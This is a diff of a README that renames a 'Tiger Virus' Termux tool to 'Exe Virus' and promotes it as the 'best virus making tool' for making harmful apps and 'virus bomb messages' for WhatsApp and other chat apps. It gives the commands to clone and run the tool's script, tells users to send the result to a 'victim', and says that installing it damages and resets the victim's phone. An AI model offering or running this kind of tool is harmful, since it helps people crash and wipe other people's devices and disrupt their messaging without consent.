@@ -1,18 +1,18 @@
-<h1>Tiger Virus </h1>
+<h1>Exe Virus </h1>
 
-<h3>WELCOME TO TIGER VIRUS TOOL</h3>
+<h3>WELCOME TO EXE VIRUS TOOL</h3>
 
 *Best Virus Making Tool To Make Virus Applications and Messeges For Whatsapp And Other Chat Applications
 
-<h4>Tool by <strong>The Devil Tigers</strong></h4>
+<h4>Tool by <strong>The Exe Virus</strong></h4>
 
 ![Screenshot_20201107-163215~2_compress68](https://user-images.githubusercontent.com/69100349/98444803-c3659900-2139-11eb-892f-86a352437f56.jpg)
 
 *For more details see my youtube channel 
 
-*Click :- [The Devil Tigers](https://www.youtube.com/c/thmalayalam)
+*Click :- [The Devil Tigers](https://www.youtube.com/c/Teambytu)
 
-<h3>How to run this Tool "Tiger Virus"</h3>
+<h3>How to run this Tool "Exe Virus"</h3>
 
 <h4>Commands</h4>
 
@@ -24,11 +24,11 @@ $ apt upgrade -y
 
 $ pkg install git -y
 
-$ git clone https://github.com/Devil-Tigers/TigerVirus.git
+$ git clone https://github.com/Team-bytu/ExeVirus.git
 
-$ cd TigerVirus
+$ cd ExeVirus
 
-$ bash TigerVirus.sh
+$ bash ExeVirus.sh
 
 After Installation the Virus Applications or text file
 Send To Victim If Application
@@ -79,11 +79,11 @@ When Any One Install It. Their Phone Will Be Damaged and Reset!
 
 <h5>Total 30 virus bomb messages </h5>
 
-<h5>1 Tiger power message </h5>
+<h5>1 Exe power message </h5>
 
 <h5>Testing</h5> 
 
-*script by THE DEVIL TIGERS
+*script by THE DEVIL TIGERS adn TEAM BYTU
 
 ©[The Devil Tigers](https://www.youtube.com/c/thmalayalam)
 
